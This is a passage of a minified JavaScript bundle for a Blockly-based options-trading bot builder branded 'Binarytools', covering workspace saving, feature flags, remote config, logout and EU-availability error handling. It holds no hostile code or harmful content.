                            disabled: (0, a.NC)("The {{block_type}} block is mandatory and cannot be deleted/disabled.", {
                                block_type: e
                            }),
                            default: (0, a.NC)("The {{block_type}} block is mandatory and cannot be deleted/disabled.", {
                                block_type: e
                            })
                        }
                    },
                    l = () => ({
                        trade_definition: i("Trade parameters"),
                        trade_parameters: i("Trade parameters"),
                        before_purchase: i("Purchase conditions"),
                        purchase_conditions: i("Purchase conditions"),
                        purchase: i("Purchase", "purchase conditions"),
                        trade_definition_tradeoptions: i("Trade options", "trade parameters"),
                        trade_definition_multiplier: i("Trade options multipliers", "trade parameters"),
                        trade_definition_accumulator: i("Trade options accumulators", "trade parameters")
                    })
            },
            50043: function(e, t, n) {
                "use strict";
                n.d(t, {
                    N: function() {
                        return l
                    },
                    T: function() {
                        return i
                    }
                });
                var a = n(65464);
                let i = (e, t) => {
                        let n = Error(t);
                        return n.name = e, n.code = e, n
                    },
                    l = function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {};
                        a.P.emit("ui.log.error", e), window.trackJs && trackJs.track(`${e} - Error: ${JSON.stringify(t)}`)
                    }
            },
            94576: function(e, t, n) {
                "use strict";
                n.d(t, {
                    tZ: () => b,
                    Pi: () => c.P,
                    N0: () => T.N0,
                    l5: () => _.l5,
                    Ow: () => a.O,
                    X6: () => y,
                    VG: () => s,
                    N_: () => r.N,
                    zG: () => h,
                    GZ: () => m,
                    lY: () => _.lY,
                    mT: () => v,
                    ZT: () => o,
                    WN: () => _.WN,
                    S3: () => p,
                    dY: () => g,
                    Xt: () => _.Xt,
                    Tr: () => r.T,
                    Vc: () => f
                });
                var a = n("8813"),
                    i = n("48059"),
                    l = n("47962");
                let o = e => {
                        let {
                            opposites: t
                        } = (0, l.vc)(), n = (0, i.NC)("Unknown");
                        return Object.keys(t).forEach(a => {
                            t[a].forEach(t => {
                                let i = Object.entries(t)[0];
                                if (i[0] === e.contract_type) {
                                    if (["CALL", "PUT"].includes(i[0])) {
                                        let t = e.shortcode.split("_").slice(-2)[0],
                                            n = /^S0P$/.test(t);
                                        if (a !== (n ? "CALLPUT" : "HIGHERLOWER")) return
                                    }
                                    n = i[1]
                                }
                            })
                        }), n
                    },
                    s = e => {
                        let t = new Date,
                            n = (t.getTime() - e) / 1e3;
                        if (n < 60) return (0, i.NC)("{{secondPast}}s ago", {
                            secondPast: parseInt(n)
                        });
                        if (n < 3600) return (0, i.NC)("{{minutePast}}m ago", {
                            minutePast: parseInt(n / 60)
                        });
                        if (n <= 86400) return (0, i.NC)("{{hourPast}}h ago", {
                            hourPast: parseInt(n / 3600)
                        });
                        let a = new Date(e),
                            l = a.getDate(),
                            o = a.toDateString().match(/ [a-zA-Z]*/)[0].replace(" ", ""),
                            s = `${a.getFullYear()===t.getFullYear()?"":" "}${a.getFullYear()}`;
                        return `${l} ${o}${s}`
                    };
                var r = n("50043"),
                    d = n("55967"),
                    c = n("65464");
                let u = e => {
                        null !== window.Blockly.getSelected() && null === window.Blockly.getSelected().parentBlock_ && ("Delete" === e.key || "Backspace" === e.key) && p("BLOCK_DELETION", c.P)
                    },
                    m = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "keydown";
                        window.removeEventListener(e, u)
                    },
                    b = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : "keydown";
                        window.addEventListener(e, u)
                    },
                    p = (e, t) => {
                        if ("BLOCK_DELETION" === e) {
                            var n, a, i;
                            (null === d.T || void 0 === d.T ? void 0 : null === (n = (0, d.T)()) || void 0 === n ? void 0 : n[window.Blockly.getSelected().type]) && t.emit("ui.log.error", null === d.T || void 0 === d.T ? void 0 : null === (i = (0, d.T)()) || void 0 === i ? void 0 : null === (a = i[window.Blockly.getSelected().type]) || void 0 === a ? void 0 : a.default)
                        }
                    },
                    f = e => new Promise((t, n) => {
                        let a = document.createElement("script");
                        a.src = e, a.async = !0, a.onload = () => t(window.external_global_component), a.onerror = n, document.body.appendChild(a)
                    });
                var _ = n("66345");
                let h = function() {
                        for (var e = arguments.length, t = Array(e), n = 0; n < e; n++) t[n] = arguments[n];
                        return e => t.reduce((e, t) => t(e), e)
                    },
                    v = e => Array.from(new DOMParser().parseFromString(e, "text/xml").getElementsByTagName("block")).map(e => {
                        let t = e.getAttribute("type");
                        return {
                            type: t,
                            fields: Array.from(e.getElementsByTagName("field")).map(e => ({
                                name: e.getAttribute("name"),
                                value: e.textContent.trim()
                            }))
                        }
                    }),
                    y = e => e.sort((e, t) => e.type < t.type ? -1 : e.type > t.type ? 1 : JSON.stringify(e.fields) < JSON.stringify(t.fields) ? -1 : 1),
                    k = (e, t) => {
                        if ((null == e ? void 0 : e.length) !== (null == t ? void 0 : t.length)) return !1;
                        for (let o = 0; o < e.length; o++) {
                            var n, a, i, l;
                            if ((null === (n = e[o]) || void 0 === n ? void 0 : n.name) !== (null === (a = t[o]) || void 0 === a ? void 0 : a.name) || (null === (i = e[o]) || void 0 === i ? void 0 : i.value) !== (null === (l = t[o]) || void 0 === l ? void 0 : l.value)) return !1
                        }
                        return !0
                    },
                    g = (e, t) => {
                        let n = h(v, y),
                            a = h(v, y),
                            i = n(e),
                            l = a(t);
                        if ((null == i ? void 0 : i.length) !== (null == l ? void 0 : l.length)) return !1;
                        for (let e = 0; e < i.length; e++) {
                            var o, s, r, d;
                            if ((null === (o = i[e]) || void 0 === o ? void 0 : o.type) !== (null === (s = l[e]) || void 0 === s ? void 0 : s.type) || !k(null === (r = i[e]) || void 0 === r ? void 0 : r.fields, null === (d = l[e]) || void 0 === d ? void 0 : d.fields)) return !1
                        }
                        return !0
                    };
                var T = n("26855")
            },
            66345: function(e, t, n) {
                "use strict";
                n.d(t, {
                    WN: function() {
                        return u
                    },
                    Xt: function() {
                        return b
                    },
                    l: function() {
                        return p
                    },
                    l5: function() {
                        return c
                    },
                    lY: function() {
                        return m
                    }
                });
                var a = n(69483),
                    i = n.n(a),
                    l = n(26961),
                    o = n.n(l),
                    s = n(87920),
                    r = n(30810),
                    d = n(85872);
                let c = async function(e) {
                        let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : r.R.UNSAVED,
                            n = b(e);
                        n = p(e), e.setAttribute("is_dbot", !0);
                        let {
                            load_modal: {
                                updateListStrategies: a
                            },
                            save_modal: l
                        } = d.Z.instance, c = window.Blockly.derivWorkspace.current_strategy_id || window.Blockly.utils.idGenerator.genUid(), m = await u(), f = Blockly.Xml.domToText(n), _ = Date.now(), h = m.findIndex(e => e.id === c);
                        if (h >= 0) {
                            let e = m[h];
                            e.xml = f, e.name = l.bot_name, e.timestamp = _, e.save_type = t
                        } else m.push({
                            id: c,
                            timestamp: _,
                            name: l.bot_name || (0, s.vc)().default_file_name,
                            xml: f,
                            save_type: t
                        });
                        m.sort((e, t) => new Date(e.timestamp) - new Date(t.timestamp)).reverse(), m.length > 10 && m.pop(), a(m), i().setItem("saved_workspaces", o().compress(JSON.stringify(m)))
                    },
                    u = async () => {
                        try {
                            return JSON.parse(o().decompress(await i().getItem("saved_workspaces"))) || []
                        } catch (e) {
                            return []
                        }
                    },
                    m = async e => {
                        let t = await u(),
                            n = t.findIndex(t => t.id === e);
                        n >= 0 && t.splice(n, 1), await i().setItem("saved_workspaces", o().compress(JSON.stringify(t)))
                    },
                    b = e => {
                        if (e) return e.hasAttribute("collection") && "true" === e.getAttribute("collection") && e.setAttribute("collection", "true"), e.setAttribute("is_dbot", "true"), e
                    },
                    p = e => {
                        let t = e.getElementsByTagName("block");
                        return (Array.isArray(t) ? t : Object.values(t)).forEach(e => {
                            let t = e.attributes.getNamedItem("type");
                            t && "purchase" === t.value && (t.value = "apollo_purchase")
                        }), Array.from(e.getElementsByTagName("variable")).forEach(e => {
                            !e.hasAttribute("type") && e.setAttribute("type", ""), !e.hasAttribute("islocal") && e.setAttribute("islocal", "false"), !e.hasAttribute("iscloud") && e.setAttribute("iscloud", "false")
                        }), e
                    }
            },
            65464: function(e, t, n) {
                "use strict";
                n.d(t, {
                    P: function() {
                        return l
                    },
                    Z: function() {
                        return i
                    }
                });
                var a = n(35369);
                class i {
                    register(e, t, n, i, l) {
                        var o = this;
                        l && this.unregisterAll(e);
                        let s = e => {
                            e.type === i.type && (this.unregister("api.error", s), i.unregister.forEach(e => {
                                e instanceof Array ? this.unregister(...e) : this.unregisterAll(e)
                            }))
                        };
                        i && this.register("api.error", s);
                        let r = function() {
                                for (var a = arguments.length, l = Array(a), r = 0; r < a; r++) l[r] = arguments[r];
                                n && o.unregister(e, t), i && o.unregister("api.error", s), t(...l)
                            },
                            d = this.eam.get(e);
                        this.eam = d ? this.eam.set(e, d.push({
                            action: r,
                            searchBy: t
                        })) : this.eam.set(e, new a.aV().push({
                            action: r,
                            searchBy: t
                        }))
                    }
                    unregister(e, t) {
                        this.eam = this.eam.set(e, this.eam.get(e).filter(e => e.searchBy !== t))
                    }
                    isRegistered(e) {
                        return this.eam.has(e)
                    }
                    unregisterAll(e) {
                        this.eam = this.eam.delete(e)
                    }
                    emit(e, t) {
                        this.eam.has(e) && this.eam.get(e).forEach(e => e.action(t))
                    }
                    setState() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                        this.state = { ...this.state,
                            ...e
                        }
                    }
                    getState(e) {
                        var t;
                        return null === (t = this.state) || void 0 === t ? void 0 : t[e]
                    }
                    constructor() {
                        this.eam = new a.D5
                    }
                }
                let l = new i
            },
            29265: function(e, t, n) {
                "use strict";

                function a() {
                    let e, t;
                    let n = new Promise((n, a) => {
                        e = n, t = a
                    });
                    return n.isPending = !0, n.resolve = t => {
                        n.isPending = !1, e(t)
                    }, n.reject = e => {
                        n.isPending = !1, t(e)
                    }, n
                }
                n.d(t, {
                    Z: function() {
                        return a
                    }
                })
            },
            26855: function(e, t, n) {
                "use strict";
                n.d(t, {
                    N0: function() {
                        return i
                    },
                    kH: function() {
                        return l
                    },
                    rK: function() {
                        return o
                    }
                });
                var a = n(47962);
                let i = () => {
                        let e = window.Blockly.derivWorkspace;
                        e && document.getElementById("scratch_div") && window.Blockly.svgResize(e)
                    },
                    l = (e, t) => {
                        (Array.isArray(t) ? t : [t]).forEach(t => {
                            (0, a.vc)().single_instance_blocks.includes(t) && e.getAllBlocks().forEach(e => {
                                e.type === t && e.dispose()
                            })
                        })
                    },
                    o = () => "rtl" === document.documentElement.getAttribute("dir")
            },
            30453: function(e, t, n) {
                "use strict";
                n.d(t, {
                    q: function() {
                        return l
                    }
                });
                var a = n(37979),
                    i = n(46543);
                let l = function() {
                    let {
                        handleLogout: e,
                        client: t
                    } = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {}, {
                        featureFlagValue: n,
                        isGBLoaded: l
                    } = (0, i.Z)({
                        featureFlag: "hydra_be"
                    }), o = (0, a.sX)(n, l), {
                        OAuth2Logout: s
                    } = (0, a.il)({
                        OAuth2EnabledApps: n,
                        OAuth2EnabledAppsInitialised: l
                    }, e ? ? (() => Promise.resolve()));
                    return {
                        isOAuth2Enabled: o,
                        oAuthLogout: async () => {
                            null == t || t.setIsLoggingOut(!0), await s()
                        }
                    }
                }
            },
            46543: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => r
                });
                var a = n("67294"),
                    i = n("89471"),
                    l = n("83571"),
                    o = n("22273");
                let s = () => {
                        let [e, t] = (0, a.useState)(!1), {
                            data: n
                        } = (0, o.Z)(!0), [i, s] = (0, a.useState)(!0);
                        return (0, a.useEffect)(() => {
                            let e;
                            if (null == n ? void 0 : n.marketing_growthbook) {
                                let n = 0;
                                e = setInterval(() => {
                                    var a;
                                    if (n > 20) {
                                        clearInterval(e), s(!1);
                                        return
                                    }
                                    n += 1, (null === l.Analytics || void 0 === l.Analytics ? void 0 : null === (a = l.Analytics.getInstances()) || void 0 === a ? void 0 : a.ab) && (t(!0), clearInterval(e))
                                }, 500)
                            } else s(!1);
                            return () => {
                                clearInterval(e)
                            }
                        }, [n.marketing_growthbook]), {
                            isGBLoaded: e,
                            isGBAvailable: i
                        }
                    },
                    r = e => {
                        let {
                            featureFlag: t,
                            defaultValue: n
                        } = e, o = void 0 !== n && n, [r, d] = (0, a.useState)((null === l.Analytics || void 0 === l.Analytics ? void 0 : l.Analytics.getFeatureValue(t, o)) ? ? o), {
                            isGBLoaded: c
                        } = s(), u = (0, i.tm)();
                        return "undefined" != typeof window && (window.Analytics = l.Analytics), (0, a.useEffect)(() => {
                            if (c) {
                                var e, n, a, i;
                                if (null === l.Analytics || void 0 === l.Analytics ? void 0 : null === (e = l.Analytics.getInstances()) || void 0 === e ? void 0 : e.ab) {
                                    let e = () => {
                                        let e = null === l.Analytics || void 0 === l.Analytics ? void 0 : l.Analytics.getFeatureValue(t, o);
                                        u() && d(e)
                                    };
                                    e(), null === l.Analytics || void 0 === l.Analytics || null === (i = l.Analytics.getInstances()) || void 0 === i || null === (a = i.ab) || void 0 === a || null === (n = a.GrowthBook) || void 0 === n || n.setRenderer(() => {
                                        e()
                                    })
                                }
                            }
                        }, [c, o, t, u]), {
                            featureFlagValue: r,
                            isGBLoaded: c
                        }
                    }
            },
            22273: function(e, t, n) {
                "use strict";
                n.d(t, {
                    Z: () => s
                });
                var a = n("67294"),
                    i = n("12838"),
                    l = JSON.parse('{"cs_chat_livechat":true,"cs_chat_whatsapp":true,"marketing_growthbook":true,"passkeys":true,"tracking_GTM":true,"tracking_datadog":true,"tracking_hotjar":true,"tracking_rudderstack":true}');
                let o = async function() {
                        let e = "https://app-config-prod.firebaseio.com/remote_config/deriv-app.json",
                            t = await fetch(e);
                        if (!t.ok) throw Error("Remote Config Server is out of reach!");
                        return t.json()
                    },
                    s = function() {
                        let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                            [t, n] = (0, a.useState)(l);
                        return (0, a.useEffect)(() => {
                            e && o().then(async e => {
                                let a = await i.gb.hashObject(e);
                                a !== await i.gb.hashObject(t) && n(e)
                            }).catch(e => {
                                console.error("Remote Config error: ", e)
                            })
                        }, [e]), {
                            data: t
                        }
                    }
            },
            79649: function(e, t, n) {
                "use strict";
                n.d(t, {
                    T: function() {
                        return l
                    }
                });
                var a = n(67294),
                    i = n(89064);
                let l = () => {
                    let [e, t] = (0, a.useState)(i.cR.UNKNOWN), [n, l] = (0, a.useState)(!1), [o, s] = (0, a.useState)(!1), [r, d] = (0, a.useState)([]), [c, u] = (0, a.useState)(null), [m, b] = (0, a.useState)("");
                    return (0, a.useEffect)(() => {
                        let e = i.IS.subscribe(e => {
                                t(e)
                            }),
                            n = i.Nf.subscribe(e => {
                                l(e)
                            }),
                            a = i.C9.subscribe(e => {
                                s(e)
                            }),
                            o = i.ao.subscribe(e => {
                                d(e)
                            }),
                            r = i.FT.subscribe(e => {
                                u(e), b((null == e ? void 0 : e.loginid) ? ? "")
                            });
                        return () => {
                            e.unsubscribe(), n.unsubscribe(), a.unsubscribe(), o.unsubscribe(), r.unsubscribe()
                        }
                    }, []), {
                        connectionStatus: e,
                        isAuthorized: n,
                        isAuthorizing: o,
                        accountList: r,
                        authData: c,
                        activeLoginid: m
                    }
                }
            },
            1051: function(e, t, n) {
                "use strict";
                n.d(t, {
                    t: () => o
                });
                var a = n("67294");
                let i = "undefined" != typeof window ? a.useLayoutEffect : a.useEffect,
                    l = function(e, t, n, l) {
                        let o = (0, a.useRef)(t);
                        i(() => {
                            o.current = t
                        }, [t]), (0, a.useEffect)(() => {
                            let t, a;
                            return t = (null == n ? void 0 : n.current) ? ? window, a = e => o.current(e), !(null == t ? void 0 : t.addEventListener) || t.addEventListener(e, a, l), () => {
                                null == t || t.removeEventListener(e, a, l)
                            }
                        }, [e, n, l])
                    };

                function o(e, t, n) {
                    let a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "mousedown";
                    l(a, a => {
                        let i = null == e ? void 0 : e.current;
                        if (!(!i || i.contains(a.target)))(!n || n(a)) && t(a)
                    })
                }
            },
            83274: function(e, t, n) {
                "use strict";
                n.d(t, {
                    g3: () => tg,
                    oR: () => tT
                });
                var a = {};
                n.r(a), n.d(a, {
                    after_purchase: () => B,
                    balance: () => F,
                    before_purchase: () => j,
                    check_direction: () => G,
                    console: () => X,
                    contract_check_result: () => Y,
                    controls_flow_statements: () => H,
                    controls_for: () => $,
                    controls_forEach: () => W,
                    controls_if: () => z,
                    controls_whileUntil: () => Z,
                    during_purchase: () => K,
                    epoch: () => q,
                    get_ohlc: () => Q,
                    is_candle_black: () => J,
                    last_digit: () => ee,
                    logic_operation: () => et,
                    math_arithmetic: () => en,
                    math_constrain: () => ea,
                    math_single: () => ei,
                    notify_telegram: () => el,
                    ohlc: () => eo,
                    ohlc_values: () => es,
                    ohlc_values_in_list: () => er,
                    procedures_ifreturn: () => ed,
                    read_details: () => ec,
                    read_ohlc: () => eu,
                    read_ohlc_obj: () => em,
                    sell_at_market: () => eb,
                    sell_price: () => ep,
                    sma_statement: () => ef,
                    text_print: () => e_,
                    text_prompt_ext: () => eh,
                    tick_analysis: () => ev,
                    todatetime: () => ey,
                    totimestamp: () => ek,
                    trade_again: () => eg,
                    trade_definition: () => eT,
                    trade_definition_multiplier: () => eA,
                    trade_definition_tradeoptions: () => ex,
                    variables_set: () => ew
                });
                var i = n("85893"),
                    l = n("67294"),
                    o = n("27412"),
                    s = n("68949"),
                    r = n("17481"),
                    d = n("66175"),
                    c = n("88199"),
                    u = n("56443"),
                    m = n("48059");
                class b {
                    constructor(e, t) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "core", void 0), (0, o._)(this, "dbot_store", void 0), (0, o._)(this, "api_helpers_store", void 0), (0, o._)(this, "timer", void 0), (0, o._)(this, "disposeReloadOnLanguageChangeReaction", void 0), (0, o._)(this, "disposeCurrencyReaction", void 0), (0, o._)(this, "disposeSwitchAccountListener", void 0), (0, o._)(this, "disposeLandingCompanyChangeReaction", void 0), (0, o._)(this, "disposeResidenceChangeReaction", void 0), (0, o._)(this, "getErrorForNonEuClients", () => ({
                            text: (0, m.NC)("Unfortunately, this trading platform is not available for EU Deriv account. Please switch to a non-EU account to continue trading."),
                            title: (0, m.NC)("Binarytools is unavailable for this account"),
                            link: (0, m.NC)("Switch to another account")
                        })), (0, o._)(this, "getErrorForEuClients", function() {
                            let e = arguments.length > 0 && void 0 !== arguments[0] && arguments[0],
                                t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : void 0;
                            return {
                                text: " ",
                                title: e ? (0, m.NC)(`Binarytools is not available for ${t||"EU"} clients`) : (0, m.NC)(`Binarytools is unavailable in ${t||"the EU"}`),
                                link: e ? (0, m.NC)("Back to Trader's Hub") : (0, m.NC)("Refresh"),
                                route: d.xOw.traders_hub
                            }
                        }), (0, o._)(this, "throwErrorForExceptionCountries", e => {
                            let {
                                client: t,
                                common: n
                            } = this.core, a = { ...(0, r.Lq)()
                            }[e];
                            if (a) return (0, d.xVn)(n.showError, this.getErrorForEuClients(t.is_logged_in, a))
                        }), (0, o._)(this, "handleErrorForEu", () => {
                            var e;
                            let {
                                client: t,
                                common: n
                            } = this.core;
                            return !(null == t ? void 0 : t.is_logged_in) && (null == t ? void 0 : t.is_eu_country) ? (this.throwErrorForExceptionCountries(null == t ? void 0 : t.clients_country), (0, d.xVn)(n.showError, this.getErrorForEuClients())) : t.is_landing_company_loaded ? (this.throwErrorForExceptionCountries(null == t ? void 0 : null === (e = t.account_settings) || void 0 === e ? void 0 : e.clients_country), t.should_show_eu_error) ? (0, d.xVn)(n.showError, this.getErrorForEuClients(t.is_logged_in)) : t.content_flag === d.DQA.HIGH_RISK_CR ? (n.setError(!1, {}), !1) : t.content_flag === d.DQA.LOW_RISK_CR_EU || !t.is_bot_allowed && t.is_eu && t.should_show_eu_error || (0, d.hWv)(t.active_accounts) || t.is_options_blocked ? (0, d.xVn)(n.showError, this.getErrorForNonEuClients(), () => {
                                var e;
                                null === (e = document.querySelector(".deriv-account-switcher__button")) || void 0 === e || e.click()
                            }, !1, !1) : (n.setError(!1, {}), !1) : (n.setError(!1, {}), !1)
                        }), (0, o._)(this, "onMount", async () => {
                            let {
                                blockly_store: e,
                                run_panel: t
                            } = this.root_store, {
                                client: n,
                                ui: a
                            } = this.core;
                            this.showDigitalOptionsMaltainvestError();
                            let i = 1;
                            this.timer = setInterval(() => {
                                window.sendRequestsStatistic && (window.sendRequestsStatistic(!1), performance.clearMeasures(), 6 === i || (null == t ? void 0 : t.is_running) ? this.timer && clearInterval(this.timer) : i++)
                            }, 1e4), this.dbot_store && (e.setLoading(!0), await c.DBot.initWorkspace("/", this.dbot_store, this.api_helpers_store, a.is_mobile, !1), e.setContainerSize(), e.setLoading(!1), this.registerCurrencyReaction.call(this), this.registerOnAccountSwitch.call(this), this.registerLandingCompanyChangeReaction.call(this), this.registerResidenceChangeReaction.call(this), window.addEventListener("click", this.onClickOutsideBlockly), e.getCachedActiveTab(), (0, s.gx)(() => (null == n ? void 0 : n.should_show_eu_error) || (null == n ? void 0 : n.is_landing_company_loaded), () => this.showDigitalOptionsMaltainvestError()), (0, s.U5)(() => null == n ? void 0 : n.content_flag, () => this.showDigitalOptionsMaltainvestError()))
                        }), (0, o._)(this, "onUnmount", () => {
                            var e, t, n;
                            c.DBot.terminateBot(), c.DBot.terminateConnection(), (null === (e = window.Blockly) || void 0 === e ? void 0 : e.derivWorkspace) && (clearInterval(null === (t = window.Blockly) || void 0 === t ? void 0 : t.derivWorkspace.save_workspace_interval), null === (n = window.Blockly.derivWorkspace) || void 0 === n || n.dispose()), "function" == typeof this.disposeReloadOnLanguageChangeReaction && this.disposeReloadOnLanguageChangeReaction(), "function" == typeof this.disposeCurrencyReaction && this.disposeCurrencyReaction(), "function" == typeof this.disposeSwitchAccountListener && this.disposeSwitchAccountListener(), "function" == typeof this.disposeLandingCompanyChangeReaction && this.disposeLandingCompanyChangeReaction(), "function" == typeof this.disposeResidenceChangeReaction && this.disposeResidenceChangeReaction(), window.removeEventListener("click", this.onClickOutsideBlockly);
                            let {
                                ui: a
                            } = this.core;
                            a.setAccountSwitcherDisabledMessage(), a.setPromptHandler(!1), this.timer && clearInterval(this.timer), performance.clearMeasures()
                        }), (0, o._)(this, "registerCurrencyReaction", () => {
                            this.disposeCurrencyReaction = (0, s.U5)(() => this.core.client.currency, () => {
                                var e, t;
                                if (!!(null === (e = window.Blockly) || void 0 === e ? void 0 : e.derivWorkspace))(null === (t = window.Blockly) || void 0 === t ? void 0 : t.derivWorkspace.getAllBlocks().filter(e => "trade_definition_tradeoptions" === e.type || "trade_definition_multiplier" === e.type || "trade_definition_accumulator" === e.type || e.isDescendantOf("trade_definition_multiplier") && "trade_parameters" === e.category_)).forEach(e => (0, u.NW)(e))
                            })
                        }), (0, o._)(this, "registerOnAccountSwitch", () => {
                            this.disposeSwitchAccountListener = (0, s.U5)(() => {
                                var e;
                                return null === (e = this.root_store.common) || void 0 === e ? void 0 : e.is_socket_opened
                            }, e => {
                                var t, n, a;
                                if (!e) return;
                                this.api_helpers_store = {
                                    server_time: this.root_store.common.server_time,
                                    ws: c.api_base.api
                                }, !(null === c.ApiHelpers || void 0 === c.ApiHelpers ? void 0 : c.ApiHelpers.instance) && c.ApiHelpers.setInstance(this.api_helpers_store), this.showDigitalOptionsMaltainvestError();
                                let i = null === c.ApiHelpers || void 0 === c.ApiHelpers ? void 0 : null === (t = c.ApiHelpers.instance) || void 0 === t ? void 0 : t.active_symbols,
                                    l = null === c.ApiHelpers || void 0 === c.ApiHelpers ? void 0 : null === (n = c.ApiHelpers.instance) || void 0 === n ? void 0 : n.contracts_for;
                                (null === c.ApiHelpers || void 0 === c.ApiHelpers ? void 0 : c.ApiHelpers.instance) && i && l && ((null === (a = window.Blockly) || void 0 === a ? void 0 : a.derivWorkspace) && (null == i || i.retrieveActiveSymbols(!0).then(() => {
                                    var e;
                                    l.disposeCache(), null === (e = window.Blockly) || void 0 === e || e.derivWorkspace.getAllBlocks().filter(e => "trade_definition_market" === e.type).forEach(e => {
                                        (0, c.runIrreversibleEvents)(() => {
                                            let t = new window.Blockly.Events.BlockCreate(e);
                                            window.Blockly.Events.fire(t)
                                        })
                                    })
                                })), c.DBot.initializeInterpreter())
                            })
                        }), (0, o._)(this, "registerLandingCompanyChangeReaction", () => {
                            let {
                                client: e
                            } = this.core;
                            this.disposeLandingCompanyChangeReaction = (0, s.U5)(() => e.landing_company_shortcode, () => this.handleErrorForEu())
                        }), (0, o._)(this, "registerResidenceChangeReaction", () => {
                            let {
                                client: e
                            } = this.core;
                            this.disposeResidenceChangeReaction = (0, s.U5)(() => {
                                var t;
                                return null === (t = e.account_settings) || void 0 === t ? void 0 : t.country_code
                            }, () => this.handleErrorForEu())
                        }), (0, o._)(this, "setDBotEngineStores", () => {
                            let {
                                flyout: e,
                                toolbar: t,
                                save_modal: n,
                                dashboard: a,
                                load_modal: i,
                                run_panel: l,
                                blockly_store: o,
                                summary_card: s
                            } = this.root_store, {
                                client: r,
                                common: d
                            } = this.core, {
                                handleFileChange: u
                            } = i, {
                                setLoading: m
                            } = o, {
                                setContractUpdateConfig: b
                            } = s, {
                                ui: {
                                    is_mobile: p
                                }
                            } = this.core;
                            this.dbot_store = {
                                client: r,
                                flyout: e,
                                toolbar: t,
                                save_modal: n,
                                dashboard: a,
                                load_modal: i,
                                run_panel: l,
                                setLoading: m,
                                setContractUpdateConfig: b,
                                handleFileChange: u,
                                is_mobile: p,
                                common: d
                            }, this.api_helpers_store = {
                                server_time: this.core.common.server_time,
                                ws: c.api_base.api
                            }
                        }), (0, o._)(this, "onClickOutsideBlockly", e => {
                            if (document.querySelector(".injectionDiv") && !(e.path || e.composedPath && e.composedPath()).some(e => e.classList && e.classList.contains("injectionDiv"))) {
                                var t;
                                null === (t = window.Blockly) || void 0 === t || t.hideChaff(!1)
                            }
                        }), (0, o._)(this, "showDigitalOptionsMaltainvestError", () => {
                            this.handleErrorForEu(!0)
                        }), (0, s.rC)(this, {
                            onMount: s.aD,
                            onUnmount: s.aD,
                            registerCurrencyReaction: s.aD,
                            registerOnAccountSwitch: s.aD,
                            registerLandingCompanyChangeReaction: s.aD,
                            registerResidenceChangeReaction: s.aD,
                            setDBotEngineStores: s.aD,
                            onClickOutsideBlockly: s.aD,
                            showDigitalOptionsMaltainvestError: s.aD
                        }), this.root_store = e, this.core = t, this.dbot_store = null, this.api_helpers_store = null, this.timer = null
                    }
                }
                var p = n("24335"),
                    f = n("58902");
                class _ {
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "is_loading", !1), (0, o._)(this, "active_tab", p.yj.WORKSPACE), (0, o._)(this, "setActiveTab", e => {
                            this.active_tab = e, (0, f.Jp)("active_tab", this.active_tab)
                        }), (0, o._)(this, "setContainerSize", () => {
                            this.active_tab === p.yj.WORKSPACE && (0, c.onWorkspaceResize)()
                        }), (0, o._)(this, "onMount", () => {
                            window.addEventListener("resize", this.setContainerSize)
                        }), (0, o._)(this, "getCachedActiveTab", () => {
                            (0, f.$8)("active_tab") && (this.active_tab = (0, f.$8)("active_tab"))
                        }), (0, o._)(this, "onUnmount", () => {
                            window.removeEventListener("resize", this.setContainerSize)
                        }), (0, o._)(this, "setLoading", e => {
                            this.is_loading = e
                        }), (0, s.rC)(this, {
                            is_loading: s.LO,
                            active_tab: s.LO,
                            setLoading: s.aD,
                            setActiveTab: s.aD
                        }), this.root_store = e
                    }
                }
                class h {
                    get is_contract_ended() {
                        let {
                            transactions: e
                        } = this.root_store;
                        return e.contracts.length > 0 && e.contracts[0].is_ended
                    }
                    constructor(e) {
                        (0, o._)(this, "root_store", void 0), (0, o._)(this, "subscription", {
                            id: null,
                            subscriber: null
                        }), (0, o._)(this, "chart_subscription_id", ""), (0, o._)(this, "symbol", void 0), (0, o._)(this, "is_chart_loading", void 0), (0, o._)(this, "chart_type", void 0), (0, o._)(this, "granularity", void 0), (0, o._)(this, "onStartBot", () => {
                            this.updateSymbol()
                        }), (0, o._)(this, "onStopBot", () => {}), (0, o._)(this, "updateSymbol", () => {
                            var e;
                            let t = window.Blockly.derivWorkspace,
                                n = null == t ? void 0 : t.getAllBlocks().find(e => "trade_definition_market" === e.type),
                                a = (null == n ? void 0 : n.getFieldValue("SYMBOL_LIST")) ? ? (null === c.api_base || void 0 === c.api_base ? void 0 : null === (e = c.api_base.active_symbols["0"]) || void 0 === e ? void 0 : e.symbol);
                            this.symbol = a
                        }), (0, o._)(this, "onSymbolChange", e => {
                            this.symbol = e, this.saveToLocalStorage()
                        }), (0, o._)(this, "updateGranularity", e => {
                            this.granularity = e, this.saveToLocalStorage()
                        }), (0, o._)(this, "updateChartType", e => {
                            this.chart_type = e, this.saveToLocalStorage()
                        }), (0, o._)(this, "setChartStatus", e => {
                            this.is_chart_loading = e
                        }), (0, o._)(this, "saveToLocalStorage", () => {
                            d.j73.set("bot.chart_props", JSON.stringify({
                                symbol: this.symbol,
                                granularity: this.granularity,
                                chart_type: this.chart_type
                            }))
                        }), (0, o._)(this, "restoreFromStorage", () => {
                            try {
                                let e = d.j73.get("bot.chart_props");
                                if (e) {
                                    let {
                                        symbol: t,
                                        granularity: n,
                                        chart_type: a
                                    } = JSON.parse(e);
                                    this.symbol = t, this.granularity = n, this.chart_type = a
                                } else this.granularity = 0, this.chart_type = "line"
                            } catch {
                                d.j73.remove("bot.chart_props")
                            }
                        }), (0, o._)(this, "getMarketsOrder", e => {
                            let t = "synthetic_index",
                                n = !!e.find(e => e.market === t);
                            return e.slice().sort((e, t) => e.display_name < t.display_name ? -1 : 1).map(e => e.market).reduce((e, t) => (-1 === e.indexOf(t) && e.push(t), e), n ? [t] : [])
                        }), (0, o._)(this, "setChartSubscriptionId", e => {
                            this.chart_subscription_id = e
